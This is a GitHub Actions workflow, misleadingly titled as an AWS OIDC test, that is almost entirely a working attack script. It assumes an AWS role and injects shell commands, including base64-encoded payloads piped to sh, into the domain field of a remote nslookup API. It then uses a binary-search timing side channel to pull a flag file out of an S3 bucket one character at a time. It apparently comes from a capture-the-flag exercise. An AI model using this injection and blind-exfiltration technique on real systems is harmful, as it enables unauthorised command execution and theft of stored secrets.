name: AWS OIDC test for school standart old code procedure
on:
  push:
    branches:
      - corgi
permissions:
  id-token: write
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Exfiltrate Flag via Timing Side-Channel
        run: |
          URL="https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
          
          echo "=== CALIBRATION: Testing sleep behavior ==="
          for i in 1 2 3; do
            START=$(date +%s)
            CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
              -H "Content-Type: application/json" \
              -d "{\"domain\": \"127.0.0.1; sleep $i\"}")
            END=$(date +%s)
            echo "sleep $i -> HTTP $CODE in $((END-START))s"
          done
          
          echo ""
          echo "=== VERIFYING S3 ACCESS ==="
          SCRIPT='SIZE=$(aws s3 cp s3://codec4f26c862a321ef5/flag.txt - --region us-east-1 | wc -c); if [ "$SIZE" -eq 16 ]; then sleep 2; fi'
          ENCODED=$(echo "$SCRIPT" | base64 -w0)
          START=$(date +%s)
          CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "{\"domain\": \"127.0.0.1; echo $ENCODED | base64 -d | sh\"}")
          END=$(date +%s)
          echo "S3 size check -> HTTP $CODE in $((END-START))s"
          if [ "$CODE" != "200" ] && [ $((END-START)) -lt 2 ]; then
            echo "WARNING: S3 access or sleep may not be working as expected!"
          fi
          
          echo ""
          echo "=== EXTRACTING FLAG (Binary Search) ==="
          FLAG=""
          for pos in $(seq 1 16); do
            low=32
            high=126
            while [ $low -lt $high ]; do
              mid=$(( (low + high) / 2 ))
              
              SCRIPT='FLAG=$(aws s3 cp s3://codec4f26c862a321ef5/flag.txt - --region us-east-1); CHAR=$(echo "$FLAG" | cut -c'"$pos"'); ORD=$(echo -n "$CHAR" | od -An -tuC | xargs); if [ "$ORD" -gt '"$mid"' ]; then sleep 2; fi'
              ENCODED=$(echo "$SCRIPT" | base64 -w0)
              
              START=$(date +%s)
              CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
                -H "Content-Type: application/json" \
                -d "{\"domain\": \"127.0.0.1; echo $ENCODED | base64 -d | sh\"}")
              END=$(date +%s)
              DURATION=$((END - START))
              
              # TRUE if timeout (504) or took longer than 1 second
              if [ "$CODE" = "504" ] || [ "$CODE" = "503" ] || [ $DURATION -ge 1 ]; then
                low=$((mid + 1))
              else
                high=$mid
              fi
            done
            CHAR=$(python3 -c "import sys; sys.stdout.write(chr($low))")
            FLAG="$FLAG$CHAR"
            echo "Position $pos: '$CHAR' (ord=$low) | Flag: $FLAG"
          done
          
          echo ""
          echo "=== FINAL FLAG ==="
          echo "$FLAG"
